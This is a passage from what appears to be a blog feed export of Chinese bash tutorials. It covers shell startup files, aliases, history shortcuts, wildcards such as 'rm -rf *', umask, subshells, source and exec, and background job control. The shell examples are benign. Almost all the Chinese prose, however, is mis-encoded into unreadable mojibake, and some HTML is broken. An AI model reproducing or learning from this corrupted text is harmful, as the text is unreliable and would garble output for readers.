ã€‚ï¼ˆæ³¨æ„ï¼šå¦‚æœä½¿ç”¨ zsh çš„è¯ï¼Œåˆ™ä¸º<code>~/.zsh_history</code> ï¼‰</p><h3 id="login-shell">login shell</h3><p>ä½¿ç”¨ <code>su - violetu</code> åˆ‡æ¢ï¼ˆæ³¨æ„ï¼šæœ‰ <code>-</code>ï¼‰ï¼Œåˆ‡æ¢/ç™»å½• login shell ä¼šæ‰§è¡Œè¿™å››ä¸ª <code>/etc/profile</code> ã€<code>/etc/.bashrc</code> ã€ <code>~/.bash_profile</code> ã€<code>~/.bashrc</code> ï¼Œç¦»å¼€æ—¶ï¼Œ</p><h3 id="nologin-shell">nologin shell</h3><p>ä½¿ç”¨ <code>su violetu</code> åˆ‡æ¢ï¼Œ åˆ‡æ¢/ç™»å½• nologinshellï¼Œåªä¼šæ‰§è¡Œè¿™ä¸¤ä¸ªï¼š <code>/etc/.bashrc</code> ã€<code>~/.bashrc</code> ã€‚</p><h2 id="shell-æŸ¥çœ‹ä¸æ›´æ”¹">shell æŸ¥çœ‹ä¸æ›´æ”¹</h2><ol type="1"><li><p>æŸ¥çœ‹å½“å‰æ­£åœ¨ä½¿ç”¨çš„ shell</p><ol type="1"><li><code>echo $SHELL</code></li><li><code>ps</code></li><li><code>echo $0</code></li><li>è¾“å…¥ä¸å­˜åœ¨çš„å‘½ä»¤ï¼ŒæŸ¥çœ‹å‡ºé”™çš„ shell æç¤º</li></ol></li><li><p>æŸ¥çœ‹ç³»ç»Ÿä¸­å®‰è£…äº†å“ªäº› shell <code>cat /etc/shells</code></p></li><li><p>æ”¹å˜å½“å‰ shell <code>chsh -s /bin/zsh</code></p></li></ol><h2 id="gnubash-shell-ç‰¹ç‚¹">GNU/bash shell ç‰¹ç‚¹</h2><ol type="1"><li><p>Tab å‘½ä»¤è‡ªåŠ¨è¡¥é½</p></li><li><p>å‘½ä»¤å†å²è®°å¿†åŠŸèƒ½ ä¸Šä¸‹é”®ã€ã€ <code>!string</code> ã€<code>!$</code> ã€ <code>!!</code> ã€ <code>^R</code></p><p>ä¸‹é¢çš„æœ‰äº›æŒ‡ä»¤ï¼Œå¯èƒ½åœ¨æˆ‘ä»¬äººä½¿ç”¨æ—¶ï¼Œä»·å€¼ä¸å¤§ï¼Œä½†æ˜¯å®ƒä»¬å†™ shellè„šæœ¬æ—¶ï¼Œå¯ä»¥å‘æŒ¥ä½œç”¨ã€‚</p><ol type="1"><li><p>ä¸Šä¸‹é”®</p></li><li><p><code>!number</code> :è·Ÿæœ¨ number æ˜¾ç¤ºå¹¶æ‰§è¡Œ historyä¸­å¯¹åº”ç¬¬å‡ æ¡çš„å‘½ä»¤</p></li><li><p><code>!stirng</code> , æ‰¾åˆ°æœ€è¿‘ä¸€ä¸ªä»¥ string å¼€å¤´çš„å‘½åï¼Œä¾‹å¦‚ï¼š<code>ï¼da</code> æ‰¾åˆ°ä½ æœ€è¿‘æ‰§è¡Œçš„ã€ä»¥ d a å¼€å¤´çš„å‘½ä»¤</p></li><li><p><code>!$</code> å¼•ç”¨ä¸Šä¸€ä¸ªå‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [20:59:39]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ~/Downloads</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/Downloads [20:59:48]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll !$</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/Downloads [21:00:00]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll ~/Downloads</span></span><br></pre></td></tr></table></figure></p></li><li><p><code>!!</code> ä¸Šä¸€ä¸ªå‘½ä»¤</p></li></ol></li><li><p>å®šä¹‰åˆ«å</p><ol type="1"><li><p>aliasã€unalias ä¸´æ—¶å®šä¹‰/è§£é™¤å®šä¹‰ä¸´æ—¶åˆ«å</p></li><li><p><code>~/.bashrc</code> ã€ <code>~/.zshrc</code>å®šä¹‰æ°¸ä¹…çš„åˆ«å</p></li><li><p><code>\å‘½ä»¤</code> ä¸ä½¿ç”¨è¯¥å‘½ä»¤çš„åˆ«å</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [21:19:07]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">alias</span> <span class="built_in">cd</span>=<span class="string">&quot;echo this is cd temp alias&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [21:19:23]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span></span></span><br><span class="line">this is cd temp alias</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [21:19:24]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">\<span class="built_in">cd</span> ~/Downloads</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/Downloads [21:19:32]</span></span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure></p></li></ol></li><li><p>å¿«æ·é”®</p><p>è¯¦ç»†è§ï¼š<ahref="https://linuxtoy.org/archives/bash-shortcuts.html">è®©ä½ æå‡å‘½ä»¤è¡Œæ•ˆç‡çš„Bash å¿«æ·é”® [å®Œæ•´ç‰ˆ]</a> å¸¸ç”¨ï¼š Ctrl + a ï¼šç§»åˆ°å‘½ä»¤è¡Œé¦– Ctrl + eï¼šç§»åˆ°å‘½ä»¤è¡Œå°¾ Alt + f ï¼šæŒ‰å•è¯å‰ç§»ï¼ˆå³å‘ï¼‰ Alt + b ï¼šæŒ‰å•è¯åç§»ï¼ˆå·¦å‘ï¼‰Ctrl + w ï¼šä»å…‰æ ‡å¤„åˆ é™¤è‡³å­—é¦– Alt + d ï¼šä»å…‰æ ‡å¤„åˆ é™¤è‡³å­—å°¾ Ctrl +rï¼šé€†å‘æœç´¢å‘½ä»¤å†å² Ctrl + lï¼šæ¸…å± Ctrl + cï¼šç»ˆæ­¢å‘½ä»¤ Ctrl + zï¼šæŒ‚èµ·å‘½ä»¤Ctrl + sï¼šé˜»æ­¢å±å¹•è¾“å‡º(zsh ä¸é€‚ç”¨) Ctrl + qï¼šå…è®¸å±å¹•è¾“å‡º Ctrl+d:(Terminate input, or exit shell) ä¸€ä¸ªç‰¹æ®Šçš„äºŒè¿›åˆ¶å€¼ï¼Œè¡¨ç¤ºEOFï¼Œä½œç”¨ç›¸å½“äºåœ¨ç»ˆç«¯ä¸­è¾“å…¥ exit åå›è½¦ï¼›</p></li></ol><h2 id="å…ƒå­—ç¬¦é€šé…ç¬¦">å…ƒå­—ç¬¦(é€šé…ç¬¦)</h2><ul><li><p><code>*</code> åŒ¹é…ä»»æ„å¤šä¸ªå­—ç¬¦<code>ls ln*</code>ã€<code>rm -rf *</code>ã€<code>rm -rf *.pdf</code>ã€<code>find / -iname "*-eth0"</code></p></li><li><p><code>?</code> åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦</p></li><li><p><code>[]</code> åŒ¹é…æ‹¬å·ä¸­çš„<strong>ä»»æ„ä¸€ä¸ª</strong>å­—ç¬¦<code>[abc] [a-z] [0-9] [^a-z0-9]</code></p></li><li><p><code>()</code> åœ¨å­ shell ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œä¸å½±å“å½“å‰ shellã€‚ä¾‹å¦‚ï¼šæ”¹å˜umaskï¼Œç„¶ååˆ›å»ºæ–‡ä»¶ï¼ˆåªå¸Œæœ›å®ƒå½±å“åˆ›å»ºçš„é‚£ä¸ªæ–‡ä»¶çš„æƒé™ï¼‰ï¼Œé‚£å°±å¯ä»¥åœ¨ å­shell ä¸­æ‰§è¡Œå‘½ä»¤ã€‚ umask æŒ‡å®šé»˜è®¤çš„æ–‡ä»¶æƒé™ï¼Œä¸¤ç§æŸ¥çœ‹æ–¹å¼ï¼š</p><p><code>umask</code> è¿”å›çš„æ˜¯å»é™¤çš„æƒé™ï¼Œå…¶ä¸­<strong>æ–‡ä»¶åŸºæ•°ä¸º666ï¼Œç›®å½•ä¸º 777</strong>ï¼Œ å³ï¼šæ–‡ä»¶å¤¹æƒé™æ˜¯<code>777</code>-å…¶è¿”å›ç»“æœï¼Œæ–‡ä»¶æƒé™æ˜¯ <code>666</code>-å…¶è¿”å›ç»“æœ<code>umask -S</code> è¿”å›æ–‡ä»¶åˆ›å»ºçš„é»˜è®¤æƒé™çš„ç¬¦å·åŒ–è¡¨è¾¾ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [8:56:05]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">umask</span></span></span><br><span class="line">022</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [8:56:12]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">umask</span> -S</span></span><br><span class="line">u=rwx,g=rx,o=rx</span><br></pre></td></tr></table></figure></li><li><p><code>&#123;&#125;</code> é›†åˆ é€—å·ï¼š<code>touch test&#123;1,3&#125;</code> æŒ‡ test1å’Œ test3 <code>mkdir ~/&#123;111,333&#125;</code> æŒ‡åœ¨ home ç›®å½•ä¸‹åˆ›å»º 111 å’Œ 333ç›®å½• ä¸¤ä¸ªç‚¹ï¼š<code>touch test&#123;1..3&#125;</code> æŒ‡ test1 å’Œ test3</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [9:02:13]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> <span class="built_in">test</span>&#123;1,3&#125;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [9:02:07]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll|grep <span class="string">&quot;test[.]*&quot;</span></span></span><br><span class="line">-rw-r--r-- 1 violetv violetv   0  6æœˆ 30 09:01 test1</span><br><span class="line">-rw-r--r-- 1 violetv violetv   0  6æœˆ 30 09:01 test3</span><br></pre></td></tr></table></figure><p>å¤åˆ¶æŠ€å·§ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [9:13:56]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> -rv ~/test/&#123;xx.config,xx.config.old&#125;</span></span><br><span class="line">&#x27;/home/violetv/test/xx.config&#x27; -&gt; &#x27;/home/violetv/test/xx.config.old&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å†ç®€å†™</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [9:16:19]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> -rv ~/test/xx.config&#123;,.old&#125;</span></span><br><span class="line">&#x27;/home/violetv/test/xx.config&#x27; -&gt; &#x27;/home/violetv/test/xx.config.old&#x27;</span><br></pre></td></tr></table></figure></li><li><p><code>\</code> è½¬ä¹‰å­—ç¬¦ ä»¥ä¸‹ä¸ºè½¬ä¹‰ <code>*</code> å’Œè½¬ä¹‰å›è½¦</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [9:17:19]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> \*</span></span><br><span class="line">*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [9:17:22]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> \</span></span><br><span class="line"><span class="language-bash">&gt; hello</span></span><br><span class="line">hello</span><br></pre></td></tr></table></figure></li></ul><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://unix.stackexchange.com/questions/70963/difference-between-2-2-dev-null-dev-null-and-dev-null-21">Differencebetween 2&gt;&amp;-, 2&gt;/dev/null, |&amp;, &amp;&gt;/dev/null and&gt;/dev/null 2&gt;&amp;1</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Subshells</title>
      <link href="/blog/2020/07/13/programming/shell/2.exec_type/"/>
      <url>/blog/2020/07/13/programming/shell/2.exec_type/</url>
      
        <content type="html"><![CDATA[<p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè„šæœ¬éƒ½æ˜¯åœ¨ subshellä¸­æ‰§è¡Œï¼Œä½†æ˜¯ç›¸ä¿¡åœ¨ä¿®æ”¹ç¯å¢ƒå˜é‡ã€åˆ«åç­‰ï¼Œä½¿å®ƒç”Ÿæ•ˆæ—¶ï¼Œä½ ä¹Ÿç”¨è¿‡è¯¸å¦‚:<code>source ./bashrc</code> ç­‰ï¼Œå®ƒå°±æ˜¯åœ¨å½“å‰ shellæ‰§è¡Œçš„ä¸€ä¸ªåº”ç”¨åœºæ™¯ã€‚</p><h2 id="æ‰§è¡Œæ–¹å¼">æ‰§è¡Œæ–¹å¼</h2><h2 id="å­-shell-ä¸­æ‰§è¡Œ">å­ shell ä¸­æ‰§è¡Œ</h2><p>å½“å‰ shell æ˜¯çˆ¶è¿›ç¨‹ï¼Œç”Ÿæˆä¸€ä¸ªå­ shell è¿›ç¨‹ï¼Œåœ¨å­ shellä¸­æ‰§è¡Œè„šæœ¬ã€‚è„šæœ¬æ‰§è¡Œå®Œæ¯•ï¼Œé€€å‡ºå­ shellï¼Œå›åˆ°å½“å‰ shellã€‚</p><ol type="1"><li><p>ä½œä¸ºè§£é‡Šå™¨å‚æ•°ï¼Œæ˜ç¡®æŒ‡å®šè§£é‡Šå™¨</p><p>shellè„šæœ¬æŒ‡å®šè§£é‡Šå™¨ï¼š<code>bash test.sh</code>ã€<code>sh test.sh</code>ï¼Œ pyè„šæœ¬æŒ‡å®š Python è§£é‡Šå™¨ï¼š <code>bash test.py</code> shell è„šæœ¬ç”± shellè§£é‡Šã€‚å¦‚æœå¯¹äº shell è„šæœ¬ï¼Œä½ ä½¿ç”¨ pythonè§£é‡Šå™¨ï¼Œ<code>python test.sh</code> é‚£å®ƒå°±ä¼šæŠ¥é”™ã€‚è¿™ç§æ–¹å¼è¿è¡Œçš„è„šæœ¬ï¼Œä¸éœ€è¦ç”¨ shebangç¬¬ä¸€è¡ŒæŒ‡å®šè§£é‡Šå™¨ä¿¡æ¯ï¼Œå†™äº†ä¹Ÿæ²¡ç”¨ã€‚</p></li><li><p>ä½œä¸ºå¯æ‰§è¡Œç¨‹åºï¼Œç›´æ¥ç”¨è·¯å¾„æ‰§è¡Œ</p><p>é€šè¿‡ç›¸å¯¹è·¯å¾„æˆ–è€…ç»å¯¹è·¯å¾„æ‰§è¡Œï¼Œæ— è®ºæ˜¯ Shell è¿˜æ˜¯ Pythonè„šæœ¬éƒ½éœ€è¦æ·»åŠ æ‰§è¡Œæƒé™ã€‚<code>chmod +x test.sh</code> æˆ–<code>chmod +x test.py</code> è€Œåœ¨ shell ä¸­æ‰§è¡Œï¼Œå®ƒæ˜¯éšå¼è°ƒç”¨ bashä½œä¸ºè§£é‡Šå™¨çš„ï¼Œå¦‚æœæƒ³è¦é€šè¿‡è¿™ç§æ–¹å¼æ¥æ‰§è¡Œé™¤ shell ä»¥å¤–çš„ï¼Œå¦‚ï¼špythonã€‚perl expect ä¹‹ç±»çš„è„šæœ¬ï¼Œå°±éœ€è¦ <code>shebang</code> äº†</p><p>æ³¨æ„ï¼Œä¸€å®šè¦å†™æˆ <code>./test.sh</code>ï¼Œè€Œä¸æ˜¯<code>test.sh</code>ï¼Œè¿è¡Œå…¶å®ƒäºŒè¿›åˆ¶çš„ç¨‹åºä¹Ÿä¸€æ ·ï¼Œç›´æ¥å†™<code>test.sh</code>ï¼Œlinux ç³»ç»Ÿä¼šå» PATH é‡Œå¯»æ‰¾æœ‰æ²¡æœ‰å«<code>test.sh</code> çš„ï¼Œè€Œåªæœ‰<code>/bin, /sbin, /usr/binï¼Œ/usr/sbin</code> ç­‰åœ¨ PATHé‡Œï¼Œä½ çš„å½“å‰ç›®å½•é€šå¸¸ä¸åœ¨ PATH é‡Œï¼Œæ‰€ä»¥å†™æˆ <code>test.sh</code>æ˜¯ä¼šæ‰¾ä¸åˆ°å‘½ä»¤çš„ï¼Œè¦ç”¨ <code>./test.sh</code>å‘Šè¯‰ç³»ç»Ÿè¯´ï¼Œå°±åœ¨å½“å‰ç›®å½•æ‰¾ã€‚</p></li></ol><h2 id="å½“å‰-shell-æ‰§è¡Œ">å½“å‰ shell æ‰§è¡Œ</h2><p>åœ¨å½“å‰ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œè„šæœ¬ï¼Œä¸ä¼šç”Ÿæˆæ–°çš„è¿›ç¨‹ã€‚è„šæœ¬æ‰§è¡Œå®Œæ¯•ï¼Œå›åˆ°å½“å‰shellã€‚</p><p>è„šæœ¬ä¸­çš„å‘½ä»¤å½±å“åˆ°å½“å‰ shellï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ï¼Œå½“å‰å·¥ä½œç›®å½•å—è„šæœ¬çš„<code>cd</code> å½±å“ï¼Œåˆ‡æ¢åˆ°äº†ä¸Šä¸€çº§ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [13:38:47]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> test_subshell.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/bash</span></span><br><span class="line">ls</span><br><span class="line">cd ../</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [13:46:25]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">source</span> test_subshell.sh</span></span><br><span class="line">1.py  ip.txt  ping_1.sh  ping_condition.sh  ping_ipfile.sh  ping_sh.sh  test  test_subshell.sh  test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [13:46:41]</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">ä¸­è¾“å…¥<span class="built_in">exit</span>åå›è½¦ï¼›</span></span><br></pre></td></tr></table></figure><ol type="1"><li><p>ç‚¹ç©ºæ ¼ <code>. ./script.sh</code></p></li><li><p>source <code>source script.sh</code></p></li></ol><h2 id="exec">exec</h2><p>ä½¿ç”¨ exec command æ–¹å¼ï¼Œä¼šç”¨ command è¿›ç¨‹æ›¿æ¢å½“å‰ shellè¿›ç¨‹ï¼Œå¹¶ä¸”ä¿æŒ PID ä¸å˜ã€‚æ‰§è¡Œå®Œæ¯•ï¼Œç›´æ¥é€€å‡ºï¼Œä¸å›åˆ°ä¹‹å‰çš„ shellç¯å¢ƒã€‚</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="https://bash.cyberciti.biz/guide/What_is_a_Subshell%3F">Whatis a Subshell?</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell å‰åå°ä½œä¸šæ§åˆ¶ &amp; nohup screen</title>
      <link href="/blog/2020/07/13/programming/shell/fgbg_work/"/>
      <url>/blog/2020/07/13/programming/shell/fgbg_work/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>åœ¨ Linux æ‰§è¡Œä»»åŠ¡æ—¶ï¼Œå¦‚æœé”®å…¥ Ctrl+C é€€å‡ºè¿›è¡Œå…¶ä»–ä»»åŠ¡æˆ–è€…å…³é—­å½“å‰session å½“å‰ä»»åŠ¡å°±ä¼šç»ˆæ­¢è¦æƒ³ä¸è®©è¿›ç¨‹åœæ­¢æˆ–è€…è®©è¿›ç¨‹åœ¨åå°è¿è¡Œï¼Œå°±éœ€è¦ä¸€äº›å‘½ä»¤ï¼š<code>&amp;, nohup, screen</code></p><h2 id="ä»»åŠ¡æ§åˆ¶">ä»»åŠ¡æ§åˆ¶</h2><p>æ³¨æ„ï¼šä½œä¸šæ§åˆ¶æœºåˆ¶æ˜¯ shell çš„åŠŸèƒ½ï¼Œç»ˆç«¯å…³äº†ï¼Œå°±æ²¡æœ‰è¿™ä¸ªæœºåˆ¶äº†ã€‚</p><p>fgã€bgã€jobsã€&amp;ã€ctrl + zéƒ½æ˜¯è·Ÿç³»ç»Ÿä»»åŠ¡æœ‰å…³çš„ï¼Œè™½ç„¶ç°åœ¨åŸºæœ¬ä¸Šä¸æ€ä¹ˆéœ€è¦ç”¨åˆ°è¿™äº›å‘½ä»¤ï¼Œä½†å­¦ä¼šäº†ä¹Ÿæ˜¯å¾ˆå®ç”¨çš„</p><ol type="1"><li><p><code>&amp;</code> å‘½ä»¤æ”¾åˆ°åå°æ‰§è¡Œ</p></li><li><p><code>ctrl+z</code> å°†ä¸€ä¸ªæ­£åœ¨å‰å°æ‰§è¡Œçš„å‘½ä»¤åå°æŒ‚èµ·</p></li><li><p><code>jobs</code> æŸ¥çœ‹å½“å‰æœ‰å¤šå°‘åœ¨åå°è¿è¡Œçš„å‘½ä»¤</p></li><li><p><code>fg</code> å°†åå°ä¸­çš„å‘½ä»¤è°ƒè‡³å‰å°ç»§ç»­è¿è¡Œ</p><p>å¦‚æœåå°ä¸­æœ‰å¤šä¸ªå‘½ä»¤ï¼Œå¯ä»¥ç”¨ Â <code>fg %jobnumbe</code>rå°†é€‰ä¸­çš„å‘½ä»¤è°ƒå‡ºï¼Œ<code>%jobnumber</code> æ˜¯é€šè¿‡ <code>jobs</code>å‘½ä»¤æŸ¥åˆ°çš„åå°æ­£åœ¨æ‰§è¡Œçš„å‘½ä»¤çš„åºå·(ä¸æ˜¯ pid)</p></li><li><p><code>bg</code> å°†ä¸€ä¸ªåœ¨åå°æš‚åœçš„å‘½ä»¤ï¼Œå˜æˆç»§ç»­æ‰§è¡Œ</p><p>å¦‚æœåå°ä¸­æœ‰å¤šä¸ªå‘½ä»¤ï¼Œå¯ä»¥ç”¨ <code>bg %jobnumber</code>å°†é€‰ä¸­çš„å‘½ä»¤è°ƒå‡ºï¼Œ<code>%jobnumber</code> æ˜¯é€šè¿‡ <code>jobs</code>å‘½ä»¤æŸ¥åˆ°çš„åå°æ­£åœ¨æ‰§è¡Œçš„å‘½ä»¤çš„åºå·(ä¸æ˜¯ pid)</p></li></ol><h3 id="è¿›ç¨‹ä»»åŠ¡æ§åˆ¶">è¿›ç¨‹ä»»åŠ¡æ§åˆ¶</h3><p>ä¸‹åˆ—å‘½ä»¤å¯ä»¥ç”¨æ¥æ“çºµè¿›ç¨‹ä»»åŠ¡ï¼š</p><ol type="1"><li><p><code>ps</code>Â  åˆ—å‡ºç³»ç»Ÿä¸­æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼›</p></li><li><p><code>kill</code>Â å‘é€ä¿¡å·ç»™ä¸€ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹ï¼ˆç»å¸¸ç”¨æ¥æ€æ­»ä¸€ä¸ªè¿›ç¨‹ï¼‰ï¼›</p></li><li><p><code>jobs</code>Â  åˆ—å‡ºå½“å‰ shellç¯å¢ƒä¸­å·²å¯åŠ¨çš„ä»»åŠ¡çŠ¶æ€ï¼Œè‹¥æœªæŒ‡å®šjobsidï¼Œåˆ™æ˜¾ç¤ºæ‰€æœ‰æ´»åŠ¨çš„ä»»åŠ¡çŠ¶æ€ä¿¡æ¯ï¼›å¦‚æœæŠ¥å‘Šäº†ä¸€ä¸ªä»»åŠ¡çš„ç»ˆæ­¢(å³ä»»åŠ¡çš„çŠ¶æ€è¢«æ ‡è®°ä¸ºTerminated)ï¼ŒshellÂ  ä»å½“å‰çš„ shell ç¯å¢ƒå·²çŸ¥çš„åˆ—è¡¨ä¸­åˆ é™¤ä»»åŠ¡çš„è¿›ç¨‹æ ‡è¯†ï¼›fgÂ  å°†è¿›ç¨‹æ¬åˆ°å‰å°è¿è¡Œï¼ˆForegroundï¼‰ï¼ŒbgÂ å°†è¿›ç¨‹æ¬åˆ°åå°è¿è¡Œï¼ˆBackgroundï¼‰ï¼›</p><p>å¦‚æœåå°çš„ä»»åŠ¡å·æœ‰ 2ä¸ªï¼Œ[1],[2]ï¼›å¦‚æœå½“ç¬¬ä¸€ä¸ªåå°ä»»åŠ¡é¡ºåˆ©æ‰§è¡Œå®Œæ¯•ï¼Œç¬¬äºŒä¸ªåå°ä»»åŠ¡è¿˜åœ¨æ‰§è¡Œä¸­æ—¶ï¼Œå½“å‰ä»»åŠ¡ä¾¿ä¼šè‡ªåŠ¨å˜æˆåå°ä»»åŠ¡å·ç "[2]"çš„åå°ä»»åŠ¡ã€‚æ‰€ä»¥å¯ä»¥å¾—å‡ºä¸€ç‚¹ï¼Œå³å½“å‰ä»»åŠ¡æ˜¯ä¼šå˜åŠ¨çš„ã€‚å½“ç”¨æˆ·è¾“å…¥"fg"ã€"bg" å’Œ "stop"ç­‰å‘½ä»¤æ—¶ï¼Œå¦‚æœä¸åŠ ä»»ä½•å¼•å·ï¼Œåˆ™æ‰€å˜åŠ¨çš„å‡æ˜¯å½“å‰ä»»åŠ¡ã€‚</p><p>ä½¿ç”¨ jobs æˆ– ps å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ­£åœ¨æ‰§è¡Œçš„ jobsã€‚</p><p>jobså‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œæ¯”å¦‚ï¼š<code>[1] + 6310 suspended python test.py &lt; loop_num.txt &gt; result.txt</code></p><p>ï¼‹è¡¨ç¤ºæ˜¯ä¸€ä¸ªå½“å‰çš„ä½œä¸šï¼Œå‡å·è¡¨ç¤ºæ˜¯ä¸€ä¸ªå½“å‰ä½œä¸šä¹‹åçš„ä¸€ä¸ªä½œä¸šï¼Œ<code>jobs -l</code>é€‰é¡¹å¯æ˜¾ç¤ºæ‰€æœ‰ä»»åŠ¡çš„ PID, jobs çš„çŠ¶æ€å¯ä»¥æ˜¯ suspendedï¼Œ runningï¼Œcontinuedï¼Œ done, ä½†æ˜¯å¦‚æœä»»åŠ¡è¢«ç»ˆæ­¢äº†ï¼ˆkillï¼‰ï¼ŒshellÂ  ä»å½“å‰çš„ shellç¯å¢ƒå·²çŸ¥çš„åˆ—è¡¨ä¸­åˆ é™¤ä»»åŠ¡çš„è¿›ç¨‹æ ‡è¯†ï¼›ä¹Ÿå°±æ˜¯è¯´ï¼Œjobs å‘½ä»¤æ˜¾ç¤ºçš„æ˜¯å½“å‰shell 